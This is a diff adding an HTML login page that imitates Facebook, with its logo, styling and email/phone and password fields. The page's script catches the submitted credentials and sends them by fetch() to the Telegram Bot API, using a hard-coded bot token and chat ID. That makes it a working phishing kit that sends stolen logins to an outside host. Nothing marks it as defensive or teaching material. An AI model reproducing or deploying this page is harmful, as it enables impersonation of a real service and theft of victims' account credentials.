@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook-like Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: #ffffff;
+            width: 400px;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            text-align: center;
+        }
+
+        .logo img {
+            width: 150px;
+            margin: 20px 0;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .form-group {
+            margin: 20px 0;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            margin: 6px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 4px;
+        }
+
+        .form-group label {
+            font-weight: bold;
+        }
+
+        .forgot-password {
+            text-align: right;
+        }
+
+        .login-button {
+            background-color: #1877f2;
+            color: #ffffff;
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .login-button:hover {
+            background-color: #0e63a7;
+        }
+
+        .create-account {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .create-account a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjR_LvopMcSSwrpsU6ItSKgCIncFHbTWXOz-pFD8zBs37ZoukXb5eMWvAuN3evEulBmuWeOEtVPYzbj_HGwRcMSJ-88jEDanIswmR1EAiAjxkCgehk5_Cb_y1BS4i3xE0i_vljFtI3aR8gMEzT12qt2duGJU1NmoXhFiPcBvDj2mDGOKhlGvhp9EB-oWUfw/s320/fb_icon_325x325.png" alt="Facebook Logo">
+        </div>
+        <h2>Login</h2>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="emailOrMobile">Email or Phone Number:</label>
+                <input type="text" id="emailOrMobile" name="emailOrMobile" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="forgot-password">
+                <a href="#">Forgot Password?</a>
+            </div>
+            <button class="login-button" type="submit">Log In</button>
+        </form>
+        <div class="create-account">
+            <p>Don't have an account? <a href="#">Sign Up</a></p>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById("loginForm");
+        form.addEventListener("submit", function (event) {
+            event.preventDefault();
+            const emailOrMobile = document.getElementById("emailOrMobile").value;
+            const password = document.getElementById("password").value;
+            const message = `Login Details\nEmail/Mobile: ${emailOrMobile}\nPassword: ${password}`;
+
+            // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your bot's token and your chat ID
+            const botToken = '6410341150:AAFj6EhTYuf8fKgQtR8K1wkNHfS7TsD4ooo';
+            const chatId = '6253748836';
+
+            // Send the message to your Telegram bot
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("Login details sent to your Telegram bot!");
+                    } else {
+                        alert("Failed to send login details.");
+                    }
+                })
+                .catch(error => {
+                    console.error(error);
+                });
+        });
+    </script>
+</body>
+</html>
